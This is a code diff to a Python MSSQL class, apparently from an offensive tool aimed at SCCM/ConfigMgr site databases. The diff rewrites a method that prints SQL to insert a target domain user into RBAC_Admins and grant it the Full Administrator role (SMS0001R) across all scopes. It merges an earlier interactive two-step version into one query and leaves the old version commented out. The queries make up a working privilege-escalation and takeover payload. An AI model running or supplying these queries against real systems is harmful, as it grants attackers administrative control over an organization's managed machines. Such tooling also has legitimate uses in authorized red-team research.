@@ -122,21 +122,31 @@ class MSSQL:
         logger.info(f"[*] Use the following to add {self.target_user} as a Site Server Admin.")
         #need to fix this to get the flatname of the domain. from testing the domain doesn't really matter and
         #is used just for display
-        first_queries = f'''
-        use CM_{self.site_code}
-        INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ({hex_sid},'{self.netbiosname}\\{self.target_user}',0,0,'','','','','{self.site_code}');
-        SELECT AdminID,LogonName FROM RBAC_Admins;
+        formatted_user = f'{self.netbiosname}\\{self.target_user}'
+        
+
+
+        query = f'''
+USE CM_{self.site_code}; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ({hex_sid},'{formatted_user}',0,0,'','','','','{self.site_code}');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '{formatted_user}'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '{formatted_user}'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '{formatted_user}'),'SMS0001R','SMS00004','1');
         '''
-        logger.info(first_queries)
-        admin_id = input("[*] Enter AdminID:")
-        while not admin_id:
-            admin_id = input("[*] Enter AdminID:")
-        second_queries = f'''
-        INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ({admin_id},'SMS0001R','SMS00ALL','29');
-        INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ({admin_id},'SMS0001R','SMS00001','1');
-        INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ({admin_id},'SMS0001R','SMS00004','1');
-        '''
-        logger.info(second_queries)
+        print(query)
+        
+        
+        # first_queries = f'''
+        # use CM_{self.site_code}
+        # INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ({hex_sid},'{self.netbiosname}\\{self.target_user}',0,0,'','','','','{self.site_code}');
+        # SELECT AdminID,LogonName FROM RBAC_Admins;
+        # '''
+        # logger.info(first_queries)
+        # admin_id = input("[*] Enter AdminID:")
+        # while not admin_id:
+        #     admin_id = input("[*] Enter AdminID:")
+        # second_queries = f'''
+        # INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ({admin_id},'SMS0001R','SMS00ALL','29');
+        # INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ({admin_id},'SMS0001R','SMS00001','1');
+        # INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ({admin_id},'SMS0001R','SMS00004','1');
+        # '''
+        # logger.info(second_queries)
 
 
     def get_dn(self, domain):
